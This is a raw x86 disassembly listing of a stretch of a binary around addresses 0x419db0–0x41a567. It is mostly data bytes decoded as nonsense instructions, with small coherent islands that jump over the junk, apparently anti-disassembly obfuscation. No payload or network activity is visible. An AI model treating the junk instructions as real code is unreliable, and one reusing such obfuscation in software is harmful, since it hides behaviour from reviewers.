  419db0:	mov    BYTE PTR [esi+0x584455be],dl
  419db6:	pop    esp
  419db7:	bound  ebp,QWORD PTR [ebp+0x5b9e8eec]
  419dbd:	js     0x419e2b
  419dbf:	fimul  DWORD PTR [ebx+ebp*8+0x6c3bb40f]
  419dc6:	in     al,dx
  419dc7:	jb     0x419d4b
  419dc9:	(bad)  
  419dca:	test   esi,ebp
  419dcc:	xor    esp,DWORD PTR [esi+0x59]
  419dcf:	ret    0x130e
  419dd2:	jne    0x419db5
  419dd4:	jno    0x419e47
  419dd6:	pop    ebp
  419dd7:	cdq    
  419dd8:	dec    esp
  419dd9:	mov    al,0xa4
  419ddb:	arpl   WORD PTR [ebp+0x55],ax
  419dde:	je     0x419e07
  419de0:	adc    bl,BYTE PTR [ebx+0x1359f9e8]
  419de6:	mov    ebx,0xee1eb28d
  419deb:	inc    edx
  419dec:	dec    edx
  419ded:	data16 mov ch,0x2b
  419df0:	retf   0x1675
  419df3:	cmp    DWORD PTR gs:[edx],0x59
  419df7:	mov    al,ds:0xceb0bcd2
  419dfc:	int3   
  419dfd:	mov    eax,ds:0xa20b47e2
  419e02:	pop    edi
  419e03:	jle    0x419df6
  419e05:	mov    dx,WORD PTR [esp+0x24]
  419e0a:	xor    cx,dx
  419e0d:	mov    dx,WORD PTR [esp+0x2c]
  419e12:	imul   cx,dx
  419e16:	mov    dx,WORD PTR [esp+0x38]
  419e1b:	and    cx,dx
  419e1e:	mov    edx,0x694c
  419e23:	and    cx,dx
  419e26:	mov    dx,WORD PTR [esp+0x3c]
  419e2b:	cmp    dx,cx
  419e2e:	ja     0x41a320
  419e34:	mov    ecx,DWORD PTR [esp+0x18]
  419e38:	mov    edx,DWORD PTR [esp+0x1c]
  419e3c:	jmp    0x41a099
  419e41:	add    edi,DWORD PTR [edx-0x6d83ed16]
  419e47:	cmp    al,0xbc
  419e49:	loopne 0x419e57
  419e4b:	inc    edx
  419e4c:	fisttp QWORD PTR [eax-0x17]
  419e4f:	push   eax
  419e50:	sahf   
  419e51:	adc    edx,DWORD PTR [edi]
  419e53:	sar    BYTE PTR [esi-0x41413dcb],0x30
  419e5a:	inc    esi
  419e5b:	std    
  419e5c:	mov    DWORD PTR [ecx-0x40275614],ecx
  419e62:	adc    ah,cl
  419e64:	(bad)  
  419e65:	neg    esi
  419e67:	clc    
  419e68:	and    ecx,ebp
  419e6a:	sub    al,0x6e
  419e6c:	jecxz  0x419e84
  419e6e:	inc    esp
  419e6f:	popf   
  419e70:	(bad)  
  419e71:	mov    dh,0x49
  419e73:	adc    al,0x13
  419e75:	fptan  
  419e78:	xchg   esi,eax
  419e79:	lods   eax,DWORD PTR ds:[esi]
  419e7a:	jmp    0x6918:0xe1f6b0d5
  419e81:	popf   
  419e82:	sub    al,0x4a
  419e84:	push   ecx
  419e85:	clc    
  419e86:	and    DWORD PTR [ebx+edx*4+0x3df6cee9],ebx
  419e8d:	stc    
  419e8e:	adc    eax,0xd9af8b4c
  419e93:	shl    DWORD PTR [eax-0x46],cl
  419e96:	xor    al,0x69
  419e98:	lahf   
  419e99:	push   0x27
  419e9b:	stc    
  419e9c:	xchg   BYTE PTR [ecx-0x60e268ab],dh
  419ea2:	(bad)  
  419ea3:	jmp    0x9ff49538
  419ea8:	sub    dl,BYTE PTR [ebx]
  419eaa:	pop    bp
  419eac:	das    
  419ead:	sti    
  419eae:	loope  0x419eb4
  419eb0:	pop    ds
  419eb1:	xor    eax,0x18c326e8
  419eb6:	sar    DWORD PTR [edx],cl
  419eb8:	test   eax,0x34fc0b12
  419ebd:	call   0x493:0x75bffad2
  419ec4:	cld    
  419ec5:	rol    bh,1
  419ec7:	jg     0x419f45
  419ec9:	adc    ebp,DWORD PTR cs:[esp+edi*2]
  419ecd:	ins    DWORD PTR es:[edi],dx
  419ece:	repnz adc DWORD PTR [edx-0x16],ebp
  419ed2:	jmp    0x98d02873
  419ed7:	adc    ebx,DWORD PTR [esi-0x31d7adf0]
  419edd:	inc    eax
  419ede:	(bad)  
  419edf:	cwde   
  419ee0:	adc    DWORD PTR ds:0xdba42d1d,edx
  419ee6:	jle    0x419ef5
  419ee8:	and    DWORD PTR [edi+0x73512348],edi
  419eee:	inc    edx
  419eef:	out    0x5,eax
  419ef1:	xchg   esi,eax
  419ef2:	mov    cl,0xe6
  419ef4:	mov    cl,bh
  419ef6:	pop    ecx
  419ef7:	cld    
  419ef8:	popf   
  419ef9:	(bad)  
  419efa:	mov    edx,0xb269b33d
  419eff:	es jbe 0x419ec8
  419f02:	pop    esp
  419f03:	dec    esp
  419f04:	push   ebx
  419f05:	add    eax,0x86169432
  419f0a:	jns    0x419ed2
  419f0c:	push   ecx
  419f0d:	sbb    BYTE PTR [ebp+0x7bcaa79f],dl
  419f13:	repz pop esi
  419f15:	add    ebp,esp
  419f17:	sub    bh,BYTE PTR [edi]
  419f19:	mov    ds:0x37c0ad23,eax
  419f1e:	mov    WORD PTR [edx],ds
  419f20:	pushf  
  419f21:	sub    al,0x35
  419f23:	or     al,0xe9
  419f25:	pusha  
  419f26:	cmp    ch,ah
  419f28:	(bad)  
  419f29:	je     0x419f27
  419f2b:	push   ebp
  419f2c:	pinsrw mm4,WORD PTR [edx],0xbb
  419f30:	hlt    
  419f31:	fimul  DWORD PTR [ebx-0x21]
  419f34:	ja     0x419f32
  419f36:	jl     0x419f09
  419f38:	push   ds
  419f39:	sub    DWORD PTR [eax],ecx
  419f3b:	pop    esi
  419f3c:	cmp    BYTE PTR [edx+0x40de951d],dh
  419f42:	xchg   ebp,eax
  419f43:	push   edi
  419f44:	mov    ch,0xe5
  419f46:	(bad)  
  419f47:	and    BYTE PTR [eax+esi*4+0x35],bh
  419f4b:	ficomp WORD PTR [ecx-0x26d357d4]
  419f51:	data16 test BYTE PTR [edx-0xcb61348],0xfe
  419f59:	sbb    esi,DWORD PTR [edi-0x3c]
  419f5c:	out    dx,eax
  419f5d:	push   edi
  419f5e:	cmp    BYTE PTR [eax],ch
  419f60:	or     ebp,esi
  419f62:	or     DWORD PTR [edx+0x5dcf1817],ebp
  419f68:	jge    0x419fb8
  419f6a:	add    DWORD PTR [ebp+0x5fc36b2c],0xffffffcd
  419f71:	xor    ebp,DWORD PTR [edi]
  419f73:	js     0x419f4d
  419f75:	jnp    0x419fe9
  419f77:	call   0xd8b4:0xcb1afaad
  419f7e:	push   ecx
  419f7f:	jbe    0x419f22
  419f81:	fcmovb st,st(0)
  419f83:	adc    al,0x27
  419f85:	add    al,0x72
  419f87:	push   esp
  419f88:	shr    BYTE PTR [edi+ecx*1-0x3e],0x1a
  419f8d:	sub    ah,ah
  419f8f:	xchg   esi,eax
  419f90:	dec    esi
  419f91:	sub    eax,0xae3e6a84
  419f96:	cwde   
  419f97:	lds    edi,FWORD PTR [eax-0x2e31d6af]
  419f9d:	imul   esi,edi,0x681d609d
  419fa3:	mov    BYTE PTR [edx+0xd],ch
  419fa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fa7:	test   BYTE PTR [edx-0x9],cl
  419faa:	mov    dl,0x1e
  419fac:	push   cs
  419fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fae:	cmp    eax,0xf6067f08
  419fb3:	push   ebp
  419fb4:	jnp    0x419f44
  419fb6:	add    ch,BYTE PTR [eax]
  419fb8:	mov    WORD PTR [ebx+0x3112f8db],ss
  419fbe:	add    BYTE PTR [ebp+ecx*1-0x38],ah
  419fc2:	fcomp  QWORD PTR [esp+ecx*2-0x7eb0bef7]
  419fc9:	mul    DWORD PTR [ebx-0x49]
  419fcc:	dec    esp
  419fcd:	xlat   BYTE PTR ds:[ebx]
  419fce:	cmp    cl,dh
  419fd0:	adc    BYTE PTR [edx+0x24baeda7],dl
  419fd6:	cwde   
  419fd7:	sub    ebp,DWORD PTR [edx]
  419fd9:	imul   ebx,DWORD PTR [eax-0xe],0xcdd77a4d
  419fe0:	sub    dh,dh
  419fe2:	add    BYTE PTR [edx],0x4
  419fe5:	pop    eax
  419fe6:	adc    DWORD PTR [ebx+0x71],edi
  419fe9:	or     BYTE PTR [esi+0x50],cl
  419fec:	adc    bh,bl
  419fee:	adc    eax,0xf0e2e758
  419ff3:	dec    esp
  419ff4:	test   eax,0xd1d33c30
  419ff9:	clc    
  419ffa:	jne    0x419fa0
  419ffc:	push   edx
  419ffd:	or     ecx,DWORD PTR [edi]
  419fff:	add    al,0xa
  41a001:	shr    ah,cl
  41a003:	out    0xd6,eax
  41a005:	dec    esp
  41a006:	call   0xb0e:0x5f3cc39d
  41a00d:	sub    DWORD PTR [edx-0x511b47e7],0x4e
  41a014:	(bad)  
  41a015:	ret    
  41a016:	mov    esp,0x6bc7de22
  41a01b:	repz pop ebx
  41a01d:	and    esi,DWORD PTR [eax+0x35052994]
  41a023:	imul   ebp,DWORD PTR [ebx-0x33e935af],0x140fd9b8
  41a02d:	add    DWORD PTR [eax+ebp*2],ecx
  41a030:	xor    edx,DWORD PTR [edx]
  41a032:	std    
  41a033:	dec    eax
  41a034:	(bad)  
  41a035:	clc    
  41a036:	mov    esp,eax
  41a038:	dec    ebx
  41a039:	loopne 0x419fdb
  41a03b:	xchg   edx,eax
  41a03c:	div    ah
  41a03e:	call   0x58e6:0xfd51d73e
  41a045:	inc    esp
  41a046:	push   edx
  41a047:	mov    al,0x33
  41a049:	jmp    0x1434a1
  41a04e:	(bad)  
  41a04f:	div    ah
  41a051:	in     eax,dx
  41a052:	js     0x41a093
  41a054:	lahf   
  41a055:	outs   dx,BYTE PTR ds:[si]
  41a057:	dec    ebx
  41a058:	adc    BYTE PTR [ebp-0x59],al
  41a05b:	(bad)  
  41a05d:	add    eax,0xf54a1b4
  41a062:	sub    eax,DWORD PTR [edx-0x7e0e0d52]
  41a068:	push   0x96a2c3b3
  41a06d:	lea    eax,[edi+0xb2aaf6a]
  41a073:	push   ebp
  41a074:	imul   ecx,DWORD PTR [edx],0xee1a346a
  41a07a:	inc    eax
  41a07b:	xchg   edx,eax
  41a07c:	and    BYTE PTR [edx-0x2b],0x8a
  41a080:	lods   al,BYTE PTR ds:[esi]
  41a081:	int3   
  41a082:	cld    
  41a083:	push   eax
  41a084:	and    BYTE PTR [eax+0xa10dee7],al
  41a08a:	popf   
  41a08b:	stc    
  41a08c:	add    eax,0x1503c608
  41a091:	hlt    
  41a092:	or     al,0x3d
  41a094:	into   
  41a095:	fsubp  st(3),st
  41a097:	lock pop edx
  41a099:	shrd   ecx,edx,0x2
  41a09d:	xor    ecx,eax
  41a09f:	mov    eax,DWORD PTR [esp+0x18]
  41a0a3:	shr    edx,0x2
  41a0a6:	mov    edx,DWORD PTR [esp+0x1c]
  41a0aa:	xor    edx,edx
  41a0ac:	jmp    0x41a309
  41a0b1:	scas   ax,WORD PTR es:[edi]
  41a0b3:	xchg   ebx,eax
  41a0b4:	mov    dh,0x9c
  41a0b6:	mov    edx,0x94c4af6c
  41a0bb:	pop    esp
  41a0bc:	sar    DWORD PTR [ecx],1
  41a0be:	js     0x41a128
  41a0c0:	ror    DWORD PTR [ebx+0x35bec01b],1
  41a0c6:	ret    0xbebe
  41a0c9:	gs xchg esp,eax
  41a0cb:	pop    edi
  41a0cc:	(bad)  [esi]
  41a0ce:	cmp    esp,DWORD PTR [edx+edi*1-0xe]
  41a0d2:	retf   
  41a0d3:	shl    DWORD PTR [ecx-0x2e],1
  41a0d6:	leave  
  41a0d7:	std    
  41a0d8:	adc    eax,0x85749a2
  41a0dd:	iret   
  41a0de:	jo     0x41a12e
  41a0e0:	leave  
  41a0e1:	ins    DWORD PTR es:[edi],dx
  41a0e2:	mov    ds:0xa6a757e6,al
  41a0e7:	cmp    eax,0x871df35
  41a0ec:	xchg   ebp,eax
  41a0ed:	stos   DWORD PTR es:[edi],eax
  41a0ee:	mov    edx,0xffb9538b
  41a0f3:	inc    ecx
  41a0f4:	xor    dl,BYTE PTR [esi+0x6265f7e6]
  41a0fa:	and    cl,bh
  41a0fc:	js     0x41a12d
  41a0fe:	out    0xc7,eax
  41a100:	stos   BYTE PTR es:[edi],al
  41a101:	out    dx,al
  41a102:	cmp    al,0xe9
  41a104:	(bad)  
  41a105:	call   0x728ba638
  41a10a:	dec    edx
  41a10b:	sbb    al,0xea
  41a10d:	pop    edx
  41a10e:	sbb    ebx,ecx
  41a110:	xchg   edx,eax
  41a111:	mov    eax,ds:0x50a356e4
  41a116:	in     ax,dx
  41a118:	sub    esi,DWORD PTR [ebp-0x77c2e3de]
  41a11e:	shl    BYTE PTR [ebp+ebp*1-0x70],1
  41a122:	repz mov ah,0xc3
  41a125:	mov    BYTE PTR [edi+0x68],bl
  41a128:	ret    0x15b
  41a12b:	mul    bh
  41a12d:	dec    ebp
  41a12e:	leave  
  41a12f:	jle    0x41a16b
  41a131:	das    
  41a132:	add    ecx,ebp
  41a134:	xor    bh,BYTE PTR [edx-0x6d5fef5f]
  41a13a:	bswap  ecx
  41a13c:	add    al,0x6e
  41a13e:	fwait
  41a13f:	sti    
  41a140:	jmp    0x89add494
  41a145:	push   0x3da1a098
  41a14a:	or     al,0x7c
  41a14c:	aas    
  41a14d:	in     eax,dx
  41a14e:	inc    ecx
  41a14f:	inc    ebp
  41a150:	xchg   edi,eax
  41a151:	hlt    
  41a152:	dec    ecx
  41a153:	adc    DWORD PTR [ebx-0x56],edi
  41a156:	test   eax,0x5d35c9a0
  41a15b:	lea    ebp,[eax-0x25aab447]
  41a161:	pop    esp
  41a162:	jnp    0x41a16e
  41a164:	fmul   DWORD PTR [ebx+0x46]
  41a167:	dec    edi
  41a168:	add    eax,esi
  41a16a:	je     0x41a1ad
  41a16c:	adc    eax,edi
  41a16e:	inc    esp
  41a16f:	sub    ah,BYTE PTR [edx+ebp*2+0x3060c4a1]
  41a176:	je     0x41a1ed
  41a178:	push   edx
  41a179:	aaa    
  41a17a:	cmp    DWORD PTR [esi],0x36
  41a17d:	call   0xaa1f:0x21826eee
  41a184:	(bad)  
  41a186:	scas   eax,DWORD PTR es:[edi]
  41a187:	xchg   esp,eax
  41a188:	mov    ah,0x95
  41a18a:	iret   
  41a18b:	add    edi,DWORD PTR [edx+esi*8]
  41a18e:	inc    esi
  41a18f:	pop    edi
  41a190:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a191:	mov    esp,0x2d333c05
  41a196:	stos   BYTE PTR es:[edi],al
  41a197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a198:	test   ecx,edx
  41a19a:	(bad)  
  41a19b:	outs   dx,DWORD PTR cs:[esi]
  41a19d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a19e:	pop    edi
  41a19f:	push   ecx
  41a1a0:	lods   eax,DWORD PTR ds:[esi]
  41a1a1:	mov    al,ds:0x64ada21d
  41a1a6:	jle    0x41a1aa
  41a1a8:	data16 test BYTE PTR [edi],ch
  41a1ab:	lock sbb ebp,DWORD PTR [edx]
  41a1ae:	jmp    0x8171679d
  41a1b3:	inc    edi
  41a1b4:	lods   eax,DWORD PTR ds:[esi]
  41a1b5:	les    ecx,FWORD PTR [edi-0xf]
  41a1b8:	push   ebp
  41a1b9:	xchg   ebp,eax
  41a1ba:	xor    al,0xa2
  41a1bc:	mov    ds:0xfaed5b71,eax
  41a1c1:	fnstenv [ecx-0x70]
  41a1c4:	xor    DWORD PTR [esi+0x5c],ebp
  41a1c7:	mov    eax,0x33cce9ec
  41a1cc:	adc    edx,DWORD PTR [ecx+ecx*4-0x6a]
  41a1d0:	data16 and cl,dl
  41a1d3:	mov    eax,0x11f7e506
  41a1d9:	sbb    al,0x29
  41a1db:	adc    bl,ch
  41a1dd:	jns    0x41a196
  41a1df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1e0:	sub    al,0x8a
  41a1e2:	popa   
  41a1e3:	pusha  
  41a1e4:	int3   
  41a1e5:	add    ebx,esi
  41a1e7:	dec    ebp
  41a1e8:	out    0x3e,al
  41a1ea:	stos   BYTE PTR es:[edi],al
  41a1eb:	adc    BYTE PTR [ebx+0x6f50d3a8],dl
  41a1f1:	jge    0x41a202
  41a1f3:	scas   eax,DWORD PTR es:[edi]
  41a1f4:	ret    0xbfcb
  41a1f7:	test   BYTE PTR [esi+0x5fba141d],bl
  41a1fd:	loopne 0x41a21e
  41a1ff:	in     eax,dx
  41a200:	xor    ecx,DWORD PTR [ecx+0x5d]
  41a203:	cwde   
  41a204:	out    dx,al
  41a205:	in     al,dx
  41a206:	inc    edi
  41a207:	and    ebp,esi
  41a209:	bound  edi,QWORD PTR [ebp+0x3f]
  41a20c:	fsub   QWORD PTR [edi]
  41a20e:	popf   
  41a20f:	push   ss
  41a210:	push   0x44
  41a212:	sub    edi,DWORD PTR [edx]
  41a214:	push   edx
  41a215:	push   esp
  41a216:	pop    edi
  41a217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a218:	push   0x50
  41a21a:	inc    eax
  41a21b:	inc    ebp
  41a21c:	pop    esp
  41a21d:	shl    eax,cl
  41a21f:	out    dx,al
  41a220:	and    al,0x3b
  41a222:	into   
  41a223:	lahf   
  41a224:	mov    edx,0x285803ef
  41a229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a22a:	mov    ds,edi
  41a22c:	fistp  DWORD PTR [edx+eax*8]
  41a22f:	sahf   
  41a230:	es pop eax
  41a232:	loopne 0x41a23f
  41a234:	shl    ecx,0x8d
  41a237:	rcl    DWORD PTR [eax+esi*8-0x16],1
  41a23b:	sbb    DWORD PTR [ecx+0x5f2684ec],0xe9f9fa30
  41a245:	jp     0x41a268
  41a247:	sub    cl,BYTE PTR [ecx]
  41a249:	mov    ah,0x65
  41a24b:	rcr    DWORD PTR [edx],1
  41a24d:	ror    DWORD PTR [edi-0x3732be1e],1
  41a253:	dec    edx
  41a254:	(bad)  
  41a255:	dec    esp
  41a256:	dec    ebp
  41a257:	fcmovu st,st(7)
  41a259:	sar    bh,0x8d
  41a25c:	scas   eax,DWORD PTR es:[edi]
  41a25d:	sahf   
  41a25e:	mov    edi,0x14b3c68e
  41a263:	dec    ecx
  41a264:	clc    
  41a265:	mov    WORD PTR [eax],cs
  41a267:	(bad)  
  41a269:	xchg   esi,eax
  41a26a:	cli    
  41a26b:	sub    DWORD PTR [edx],esp
  41a26d:	pusha  
  41a26e:	in     eax,0x2
  41a270:	imul   esi,DWORD PTR [edx-0x187e5a18],0xffffffae
  41a277:	xor    ebx,DWORD PTR [eax-0x2d]
  41a27a:	inc    eax
  41a27b:	sbb    al,0xc2
  41a27d:	pop    ebx
  41a27e:	mov    ch,0x5e
  41a280:	sub    BYTE PTR [ebp+0x43f24142],0x7c
  41a287:	lahf   
  41a288:	fidiv  DWORD PTR [edx+0x48]
  41a28b:	fwait
  41a28c:	into   
  41a28d:	push   ds
  41a28e:	dec    edx
  41a28f:	out    0xb3,al
  41a291:	call   0x1a791860
  41a296:	outs   dx,BYTE PTR ds:[esi]
  41a297:	lods   eax,DWORD PTR ds:[esi]
  41a298:	les    edx,FWORD PTR [esi+edi*2+0x2b]
  41a29c:	rcr    BYTE PTR [eax+edx*4+0x45],cl
  41a2a0:	xor    DWORD PTR [eax+0x20],ebx
  41a2a3:	xchg   BYTE PTR [edi],dh
  41a2a5:	xchg   edi,eax
  41a2a6:	mov    esp,0x403fadce
  41a2ab:	fidiv  WORD PTR [edx]
  41a2ad:	jnp    0x41a24a
  41a2af:	in     al,dx
  41a2b0:	and    edi,esi
  41a2b2:	outs   dx,DWORD PTR ds:[esi]
  41a2b3:	mov    edi,0x590f31be
  41a2b8:	pop    eax
  41a2b9:	and    eax,0x7c47d4f6
  41a2be:	popa   
  41a2bf:	popf   
  41a2c0:	cwde   
  41a2c1:	es out dx,eax
  41a2c3:	dec    ecx
  41a2c4:	(bad)  
  41a2c5:	cmp    edi,DWORD PTR [ebx+0x13]
  41a2c8:	inc    ecx
  41a2c9:	cmp    eax,DWORD PTR [esi]
  41a2cb:	pop    DWORD PTR [ebx]
  41a2cd:	sbb    al,ch
  41a2cf:	imul   ebx,DWORD PTR [esi-0x11973e55],0xffffffec
  41a2d6:	xor    ecx,ebp
  41a2d8:	loope  0x41a268
  41a2da:	mov    bl,BYTE PTR [ecx]
  41a2dc:	mov    ds:0x53c8f165,al
  41a2e1:	dec    edi
  41a2e2:	icebp  
  41a2e3:	sub    edi,DWORD PTR [edx-0x75]
  41a2e6:	cs mov ebp,edi
  41a2e9:	mov    bl,0x14
  41a2eb:	xchg   edi,eax
  41a2ec:	jne    0x41a29e
  41a2ee:	cmp    DWORD PTR [ecx-0x59],esi
  41a2f1:	sbb    BYTE PTR [eax],al
  41a2f3:	jb     0x41a2e0
  41a2f5:	adc    dh,BYTE PTR [edx+0x36]
  41a2f8:	mov    DWORD PTR [edi-0x6c],esi
  41a2fb:	lds    eax,FWORD PTR [edx-0xf]
  41a2fe:	mov    ebp,0xd622fbce
  41a303:	stos   BYTE PTR es:[edi],al
  41a304:	in     al,0x72
  41a306:	stos   BYTE PTR es:[edi],al
  41a307:	fs test eax,0x5652d10b
  41a30d:	shl    eax,0x1e
  41a310:	push   edi
  41a311:	lea    eax,[esp+0x7c]
  41a315:	push   eax
  41a316:	lea    eax,[esp+0x28]
  41a31a:	push   eax
  41a31b:	call   0x411472
  41a320:	push   DWORD PTR [esp+0x74]
  41a324:	push   DWORD PTR [esp+0x74]
  41a328:	push   DWORD PTR [esp+0x24]
  41a32c:	push   DWORD PTR [esp+0x24]
  41a330:	call   0x412349
  41a335:	mov    edx,DWORD PTR [esp+0x18]
  41a339:	mov    eax,DWORD PTR [esp+0x1c]
  41a33d:	mov    ecx,DWORD PTR [esp+0x18]
  41a341:	mov    edi,DWORD PTR [esp+0x1c]
  41a345:	shrd   edx,eax,0x2
  41a349:	shr    eax,0x2
  41a34c:	shl    ecx,0x1e
  41a34f:	xor    ecx,ecx
  41a351:	mov    eax,0x32de6d5d
  41a356:	xor    edx,eax
  41a358:	or     ecx,edx
  41a35a:	mov    edx,DWORD PTR [esp+0x5c]
  41a35e:	mov    DWORD PTR [edx],ecx
  41a360:	mov    ecx,DWORD PTR [esp+0x18]
  41a364:	jmp    0x41a5c1
  41a369:	repz sub cl,0x71
  41a36d:	mov    edx,0x20807cbb
  41a372:	shl    al,cl
  41a374:	iret   
  41a375:	mov    edx,0x4cfbdc2
  41a37a:	pop    ds
  41a37b:	sar    BYTE PTR [esi-0x41413dcb],0x65
  41a382:	in     eax,0xca
  41a384:	ret    
  41a385:	fwait
  41a386:	xor    dh,ah
  41a388:	cs call 0x8ce8e2f3
  41a38e:	cli    
  41a38f:	mov    ebx,0x84edaa6
  41a394:	sar    edi,1
  41a396:	into   
  41a397:	rcr    BYTE PTR [ecx+ecx*4-0x5709767],0x35
  41a39f:	pop    ecx
  41a3a0:	scas   eax,DWORD PTR es:[edi]
  41a3a1:	mov    ss,WORD PTR [ebx+0x2068270f]
  41a3a7:	aaa    
  41a3a8:	dec    esi
  41a3a9:	cmp    esp,DWORD PTR [ebx-0x17766bba]
  41a3af:	cmp    eax,0xac8ae73d
  41a3b4:	cmp    DWORD PTR [esp+ebx*8+0x3446b27],eax
  41a3bb:	leave  
  41a3bc:	scas   al,BYTE PTR es:[edi]
  41a3bd:	jnp    0x41a38b
  41a3bf:	stos   BYTE PTR es:[edi],al
  41a3c0:	int    0xb1
  41a3c2:	push   es
  41a3c3:	jnp    0x41a38a
  41a3c5:	scas   al,BYTE PTR es:[edi]
  41a3c6:	push   0xa951867
  41a3cb:	inc    ebx
  41a3cc:	push   edi
  41a3cd:	outs   dx,BYTE PTR ds:[esi]
  41a3ce:	and    eax,0xf9d6c3ee
  41a3d3:	inc    ebx
  41a3d4:	arpl   WORD PTR [esi-0x74],bp
  41a3d7:	test   DWORD PTR [edi-0x39c6ceb6],0xb72c29f7
  41a3e1:	dec    eax
  41a3e2:	mov    ds:0xc8b8b42c,eax
  41a3e7:	pop    edi
  41a3e8:	sahf   
  41a3e9:	ret    0xed40
  41a3ec:	(bad)  
  41a3ed:	jp     0x41a3a8
  41a3ef:	popf   
  41a3f0:	test   eax,0xfa1c80bd
  41a3f5:	jp     0x41a396
  41a3f7:	popf   
  41a3f8:	aad    0x10
  41a3fa:	pop    esp
  41a3fb:	je     0x41a422
  41a3fd:	rol    DWORD PTR [eax+0x7f],1
  41a400:	mov    dl,0x86
  41a402:	sub    esi,0x35
  41a405:	and    DWORD PTR [edx+0x65dff972],ebx
  41a40b:	addr16 xor ecx,edi
  41a40e:	adc    DWORD PTR [eax+0x9456382],edx
  41a414:	mov    cs,ecx
  41a416:	rcr    al,1
  41a418:	das    
  41a419:	mov    ah,BYTE PTR [ecx+0x46558352]
  41a41f:	ftst   
  41a421:	inc    ebp
  41a422:	shl    BYTE PTR [ebp+0x24],cl
  41a425:	rol    BYTE PTR [esi+0x3543d019],cl
  41a42b:	loopne 0x41a467
  41a42d:	leave  
  41a42e:	stos   BYTE PTR es:[edi],al
  41a42f:	dec    ebp
  41a430:	mov    BYTE PTR [esi+0x60],al
  41a433:	add    eax,0x5bd364ca
  41a438:	ja     0x41a455
  41a43a:	mov    DWORD PTR [edx+0xa],0x491c842f
  41a441:	not    BYTE PTR [eax+0x2]
  41a444:	push   0x527905d0
  41a449:	adc    ebp,DWORD PTR [ebx+0x4c897a45]
  41a44f:	inc    edi
  41a450:	pop    edi
  41a451:	mov    dh,0xd0
  41a453:	mov    al,0x53
  41a455:	xor    dh,BYTE PTR [eax]
  41a457:	std    
  41a458:	jmp    0x14919a83
  41a45d:	popf   
  41a45e:	sar    bl,cl
  41a460:	xchg   BYTE PTR [edx+0x633e8910],dl
  41a466:	fnstsw WORD PTR [eax+0x57c42b72]
  41a46c:	sub    ch,BYTE PTR [esi+esi*4-0x54]
  41a470:	xchg   ebp,ecx
  41a472:	push   edi
  41a473:	loope  0x41a449
  41a475:	hlt    
  41a476:	xlat   BYTE PTR ds:[ebx]
  41a477:	xor    DWORD PTR [ebp-0x12624235],esi
  41a47d:	sub    al,0x88
  41a47f:	push   ss
  41a480:	pandn  mm4,QWORD PTR [esi*4-0x68f76ffb]
  41a488:	pop    eax
  41a489:	ret    
  41a48a:	bound  eax,QWORD PTR [ebp+0xe]
  41a48d:	fs stos DWORD PTR es:[edi],eax
  41a48f:	fisttp DWORD PTR [edi-0x2]
  41a492:	xchg   edi,eax
  41a493:	jb     0x41a454
  41a495:	push   ebp
  41a496:	icebp  
  41a497:	dec    esp
  41a498:	(bad)  
  41a499:	cli    
  41a49a:	sbb    eax,0xb0885434
  41a49f:	in     al,0x4c
  41a4a1:	jge    0x41a4d9
  41a4a3:	into   
  41a4a4:	test   al,0xd7
  41a4a6:	rcr    DWORD PTR [edx-0x37],cl
  41a4a9:	out    0xb8,eax
  41a4ab:	aad    0x97
  41a4ad:	aad    0xec
  41a4af:	mov    ds:0x23ca91e0,eax
  41a4b4:	pop    esp
  41a4b5:	es xchg ecx,eax
  41a4b7:	aas    
  41a4b8:	pop    ebp
  41a4b9:	test   DWORD PTR [edi+0x49a8694f],eax
  41a4bf:	pushf  
  41a4c0:	repz stc 
  41a4c2:	xlat   BYTE PTR ds:[ebx]
  41a4c3:	arpl   WORD PTR [esi+0x73f05019],ax
  41a4c9:	ja     0x41a490
  41a4cb:	sbb    eax,0x72279646
  41a4d0:	jae    0x41a4df
  41a4d2:	adc    cl,BYTE PTR [edx-0x277fb59c]
  41a4d8:	sub    al,0x40
  41a4da:	mov    ds:0xfe02ae3f,eax
  41a4df:	jl     0x41a475
  41a4e1:	mov    al,ds:0x940b357d
  41a4e6:	dec    esp
  41a4e7:	pop    ebp
  41a4e8:	(bad)  
  41a4e9:	pop    ecx
  41a4ea:	fisubr WORD PTR [ecx+0x3f]
  41a4ed:	lea    ebx,[ebx+0x34433790]
  41a4f3:	add    esi,DWORD PTR [ebp+0x48f6856a]
  41a4f9:	enter  0x4d5e,0x28
  41a4fd:	ror    BYTE PTR [ecx-0x72],0x68
  41a501:	ret    
  41a502:	in     al,0x42
  41a504:	shr    esi,cl
  41a506:	outs   dx,DWORD PTR ds:[esi]
  41a507:	xchg   esi,eax
  41a508:	xor    BYTE PTR [esi+eax*1+0x246d2dc0],ah
  41a50f:	test   eax,0x60284922
  41a514:	pop    ebp
  41a515:	out    dx,eax
  41a516:	cmp    eax,0xdb70c278
  41a51b:	cdq    
  41a51c:	or     al,0x8e
  41a51e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a51f:	xchg   edi,eax
  41a520:	(bad)  
  41a521:	not    bl
  41a523:	adc    ah,ch
  41a525:	xchg   edx,eax
  41a526:	(bad)  
  41a527:	mov    ch,0x59
  41a529:	jmp    0x5aa7d819
  41a52e:	cld    
  41a52f:	jo     0x41a595
  41a531:	shr    DWORD PTR [ebp-0x68],cl
  41a534:	xor    esi,DWORD PTR [ecx-0x7af47f6a]
  41a53a:	ror    DWORD PTR [eax+0x2e],0xc4
  41a53e:	shl    esp,0x26
  41a541:	cmp    edi,DWORD PTR [edx-0x5dccf11b]
  41a547:	pop    ebp
  41a548:	test   al,0x38
  41a54a:	rcr    BYTE PTR [esi+ebp*8],0x7d
  41a54e:	popa   
  41a54f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a550:	sti    
  41a551:	(bad)  
  41a552:	ja     0x41a570
  41a554:	add    eax,0xb55e3e63
  41a559:	adc    al,0x99
  41a55b:	int3   
  41a55c:	out    dx,eax
  41a55d:	cdq    
  41a55e:	ds mov ah,0xd4
  41a561:	sbb    ch,BYTE PTR [edx-0x63]
  41a564:	test   al,0xfa
  41a566:	outs   dx,DWORD PTR ds:[esi]
  41a567:	js     0x41a5d8
